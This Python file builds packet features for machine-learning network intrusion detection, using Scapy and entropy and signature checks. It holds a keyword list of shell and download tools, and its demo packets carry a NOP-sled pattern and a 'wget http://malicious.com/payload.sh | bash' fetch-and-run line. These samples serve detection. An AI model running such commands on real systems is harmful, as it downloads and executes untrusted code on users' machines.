import pandas as pd
import numpy as np
from scapy.all import IP, TCP, UDP, Raw
from typing import Optional

def packet_to_dataframe(packet, scaler=None, max_payload_bytes=256):
    """
    Convert a Scapy packet to a Pandas DataFrame row for ML-based threat detection.
    
    Args:
        packet: A Scapy packet object
        scaler: Optional sklearn scaler (e.g., StandardScaler) fitted on training data
        max_payload_bytes: Maximum number of payload bytes to include (default: 256)
        
    Returns:
        pd.DataFrame: A single-row DataFrame with extracted features
    """
    # Initialize feature dictionary with default values
    features = {
        # IP layer features
        'ip_version': 0,
        'ip_ihl': 0,
        'ip_len': 0,
        'ip_ttl': 0,
        'ip_proto': 0,
        
        # Transport layer features
        'src_port': 0,
        'dst_port': 0,
        'tcp_flags': 0,
        
        # Payload statistical features
        'payload_len': 0,
        'payload_mean': 0.0,
        'payload_std': 0.0,
        
        # Raw payload bytes (for deep inspection)
        'payload_bytes': b''
    }
    
    # Extract IP layer features
    if packet.haslayer(IP):
        ip_layer = packet[IP]
        features['ip_version'] = ip_layer.version
        features['ip_ihl'] = ip_layer.ihl
        features['ip_len'] = ip_layer.len
        features['ip_ttl'] = ip_layer.ttl
        features['ip_proto'] = ip_layer.proto
    
    # Extract TCP layer features
    if packet.haslayer(TCP):
        tcp_layer = packet[TCP]
        features['src_port'] = tcp_layer.sport
        features['dst_port'] = tcp_layer.dport
        # TCP flags as integer (FIN=1, SYN=2, RST=4, PSH=8, ACK=16, URG=32)
        features['tcp_flags'] = int(tcp_layer.flags)
    
    # Extract UDP layer features
    elif packet.haslayer(UDP):
        udp_layer = packet[UDP]
        features['src_port'] = udp_layer.sport
        features['dst_port'] = udp_layer.dport
        # UDP doesn't have flags, so tcp_flags remains 0
    
    # Extract payload features for threat analysis
    if packet.haslayer(Raw):
        raw_layer = packet[Raw]
        payload_bytes = raw_layer.load
        
        # Truncate payload if needed (keep first max_payload_bytes)
        truncated_payload = payload_bytes[:max_payload_bytes]
        
        # Convert bytes to numpy array for statistical computation
        payload_array = np.frombuffer(payload_bytes, dtype=np.uint8)
        
        features['payload_len'] = len(payload_bytes)
        features['payload_mean'] = np.mean(payload_array)
        features['payload_std'] = np.std(payload_array)
        features['payload_bytes'] = truncated_payload
    
    # Create DataFrame
    df = pd.DataFrame([features])
    
    # Apply scaling if scaler is provided
    if scaler is not None:
        # Identify numeric columns (exclude payload_bytes)
        numeric_cols = [col for col in df.columns if col != 'payload_bytes']
        
        # Scale numeric features
        df[numeric_cols] = scaler.transform(df[numeric_cols])
    
    return df


def extract_payload_features(payload_bytes, max_bytes=256):
    """
    Extract additional threat indicators from raw payload bytes.
    
    Args:
        payload_bytes: Raw bytes from packet payload
        max_bytes: Maximum bytes to analyze
        
    Returns:
        dict: Dictionary of extracted features for threat detection
    """
    if not payload_bytes:
        return {
            'has_shellcode_pattern': 0,
            'has_suspicious_strings': 0,
            'entropy': 0.0,
            'printable_ratio': 0.0
        }
    
    payload = payload_bytes[:max_bytes]
    payload_array = np.frombuffer(payload, dtype=np.uint8)
    
    # Calculate Shannon entropy (high entropy may indicate encryption/obfuscation)
    unique, counts = np.unique(payload_array, return_counts=True)
    probabilities = counts / len(payload_array)
    entropy = -np.sum(probabilities * np.log2(probabilities + 1e-10))
    
    # Check for printable characters ratio
    printable_count = sum(1 for b in payload if 32 <= b <= 126)
    printable_ratio = printable_count / len(payload) if len(payload) > 0 else 0
    
    # Look for common shellcode patterns (NOP sleds, etc.)
    has_shellcode_pattern = int(b'\x90\x90\x90\x90' in payload or  # NOP sled
                                 b'\xeb\xfe' in payload)  # Jump short -2
    
    # Look for suspicious strings
    suspicious_keywords = [b'eval', b'exec', b'system', b'cmd', b'powershell', 
                          b'/bin/sh', b'bash', b'wget', b'curl']
    has_suspicious_strings = int(any(keyword in payload.lower() for keyword in suspicious_keywords))
    
    return {
        'has_shellcode_pattern': has_shellcode_pattern,
        'has_suspicious_strings': has_suspicious_strings,
        'entropy': entropy,
        'printable_ratio': printable_ratio
    }


def packet_to_dataframe_enhanced(packet, scaler=None, max_payload_bytes=256, 
                                  include_advanced_features=True):
    """
    Enhanced version with additional threat detection features.
    
    Args:
        packet: A Scapy packet object
        scaler: Optional sklearn scaler for numeric features
        max_payload_bytes: Maximum payload bytes to include
        include_advanced_features: Include entropy and pattern detection features
        
    Returns:
        pd.DataFrame: Single-row DataFrame with comprehensive threat detection features
    """
    # Get basic features
    df = packet_to_dataframe(packet, scaler=None, max_payload_bytes=max_payload_bytes)
    
    # Add advanced payload analysis if requested
    if include_advanced_features and packet.haslayer(Raw):
        payload_bytes = packet[Raw].load
        advanced_features = extract_payload_features(payload_bytes, max_payload_bytes)
        
        # Add advanced features to DataFrame
        for key, value in advanced_features.items():
            df[key] = value
    
    # Apply scaling if scaler is provided (only to numeric columns)
    if scaler is not None:
        numeric_cols = [col for col in df.columns if col != 'payload_bytes' and 
                       df[col].dtype in [np.float64, np.int64, np.int32]]
        df[numeric_cols] = scaler.transform(df[numeric_cols])
    
    return df


# Example usage and demonstration
if __name__ == "__main__":
    from scapy.all import IP, TCP, UDP, Raw
    
    print("="*70)
    print("PACKET TO DATAFRAME - THREAT DETECTION FEATURES")
    print("="*70)
    
    # Example 1: Basic malicious packet
    print("\n1. Basic Packet with Suspicious Payload:")
    pkt1 = IP()/TCP(dport=4444)/Raw(load=b"malicious content here")
    df1 = packet_to_dataframe(pkt1)
    print(df1.T)  # Transpose for better readability
    print(f"\nPayload bytes (truncated): {df1['payload_bytes'].iloc[0]}")
    
    # Example 2: Packet with shellcode-like pattern
    print("\n" + "="*70)
    print("\n2. Packet with Shellcode Pattern (NOP sled):")
    shellcode_payload = b'\x90' * 20 + b'\xeb\xfe' + b'some_command'
    pkt2 = IP()/TCP(sport=12345, dport=80, flags='S')/Raw(load=shellcode_payload)
    df2 = packet_to_dataframe_enhanced(pkt2, include_advanced_features=True)
    print(df2.T)
    
    # Example 3: UDP packet with suspicious command
    print("\n" + "="*70)
    print("\n3. UDP Packet with Suspicious Command:")
    pkt3 = IP()/UDP(sport=53, dport=1234)/Raw(load=b"wget http://malicious.com/payload.sh | bash")
    df3 = packet_to_dataframe_enhanced(pkt3, include_advanced_features=True)
    print(df3.T)
    
    # Example 4: Normal packet for comparison
    print("\n" + "="*70)
    print("\n4. Normal HTTP-like Packet:")
    pkt4 = IP()/TCP(sport=50000, dport=80)/Raw(load=b"GET / HTTP/1.1\r\nHost: example.com\r\n\r\n")
    df4 = packet_to_dataframe_enhanced(pkt4, include_advanced_features=True)
    print(df4.T)
    
    # Example 5: Using a scaler
    print("\n" + "="*70)
    print("\n5. With StandardScaler (demonstration):")
    from sklearn.preprocessing import StandardScaler
    
    # Create multiple packets for fitting scaler
    packets = [
        IP()/TCP()/Raw(load=b"data1"),
        IP()/TCP()/Raw(load=b"data2" * 10),
        IP()/UDP()/Raw(load=b"data3" * 5)
    ]
    
    # Create feature matrix
    dfs = [packet_to_dataframe(pkt) for pkt in packets]
    combined = pd.concat(dfs, ignore_index=True)
    numeric_cols = [col for col in combined.columns if col != 'payload_bytes']
    
    # Fit scaler
    scaler = StandardScaler()
    scaler.fit(combined[numeric_cols])
    
    # Transform new packet
    new_pkt = IP()/TCP()/Raw(load=b"test packet")
    df_scaled = packet_to_dataframe(new_pkt, scaler=scaler)
    print("Scaled features:")
    print(df_scaled[numeric_cols].T)
    
    print("\n" + "="*70)
    print("SUMMARY")
    print("="*70)
    print(f"Total features extracted: {len(df2.columns)}")
    print(f"Feature names: {list(df2.columns)}")
    print("\nThese features can be used with ML models (Random Forest, XGBoost, etc.)")
    print("for network intrusion detection and threat classification.")